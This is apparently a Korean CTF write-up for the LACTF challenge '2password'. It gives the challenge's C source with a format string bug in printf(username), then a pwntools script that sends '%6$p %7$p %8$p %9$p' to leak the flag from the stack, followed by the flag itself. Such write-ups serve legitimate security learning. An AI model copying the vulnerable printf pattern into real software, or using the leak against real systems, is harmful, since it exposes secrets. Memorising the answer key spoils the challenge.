# 2password

## Description

---

2Password > 1Password

## Environment

---

![스크린샷 2025-02-10 오후 4.21.47.png](2password%200842e4d6c51e4a73821d4cee340918c8/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_4.21.47.png)

## 코드 분석

---

### chall.c

- 아래는 문제에서 제공한 `chall.c` 이다.

```python
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void readline(char *buf, size_t size, FILE *file) {
  if (!fgets(buf, size, file)) {
    puts("wtf");
    exit(1);
  }
  char *end = strchr(buf, '\n');
  if (end) {
    *end = '\0';
  }
}

int main(void) {
  setbuf(stdout, NULL);
  printf("Enter username: ");
  char username[42];
  readline(username, sizeof username, stdin);
  printf("Enter password1: ");
  char password1[42];
  readline(password1, sizeof password1, stdin);
  printf("Enter password2: ");
  char password2[42];
  readline(password2, sizeof password2, stdin);
  FILE *flag_file = fopen("flag.txt", "r");
  if (!flag_file) {
    puts("can't open flag");
    exit(1);
  }
  char flag[42];
  readline(flag, sizeof flag, flag_file);
  if (strcmp(username, "kaiphait") == 0 &&
      strcmp(password1, "correct horse battery staple") == 0 &&
      strcmp(password2, flag) == 0) {
    puts("Access granted");
  } else {
    printf("Incorrect password for user ");
    printf(username);
    printf("\n");
  }
}
```

- 플래그의 값을 알고만 있다면 `strcmp(password2, flag) == 0)` 에 통과할 수 있다. → 그냥 플래그 제출하면 됨
- 하지만 플래그를 알지 못하니까.. 다른 방법으로 획득해야 한다.
- `printf(username)` 에서 포맷 스트링 버그가 발생한다.

## 익스플로잇

---

### Format String Bug

- `readline(flag, sizeof flag, flag_file)` 을 이용하여 플래그 값을 저장하므로, 해당 부분을 Leak하면 플래그를 획득할 수 있다.

- `readline(flag, sizeof flag, flag_file)` 에서 플래그의 값을 `[rbp-0xd0]` 에 저장한다.

![스크린샷 2025-02-10 오후 4.27.32.png](2password%200842e4d6c51e4a73821d4cee340918c8/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_4.27.32.png)

- `main` 에서 스택을 `0xd0` 만큼 할당했으므로, 플래그는 `rsp` 위치에 저장되는 것을 알 수 있다.

![스크린샷 2025-02-10 오후 4.28.20.png](2password%200842e4d6c51e4a73821d4cee340918c8/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_4.28.20.png)

- 따라서 `rsp` 부터 값을 읽으면 플래그를 획득할 수 있다.
- `rdi` → 포맷 스트링
- `rsi` → `rdx` → `rcx` → `r8` → `r9` → `[rsp]` → `[rsp+8]` → `[rsp+0x10]` ….

### exploit.py

```purescript
from pwn import *

p = remote('chall.lac.tf', 31142)

context.log_level = 'debug'

payload = b'%6$p %7$p %8$p %9$p'
p.sendlineafter(b'username: ', payload)
p.sendlineafter(b'password1: ', b'1')
p.sendlineafter(b'password2: ', b'2')

p.interactive()

# lactf{hunter2_cfc0xz68}
```

![스크린샷 2025-02-10 오후 4.31.09.png](2password%200842e4d6c51e4a73821d4cee340918c8/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-10_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_4.31.09.png)

![스크린샷 2025-02-08 오후 1.54.33.png](2password%200842e4d6c51e4a73821d4cee340918c8/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-08_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_1.54.33.png)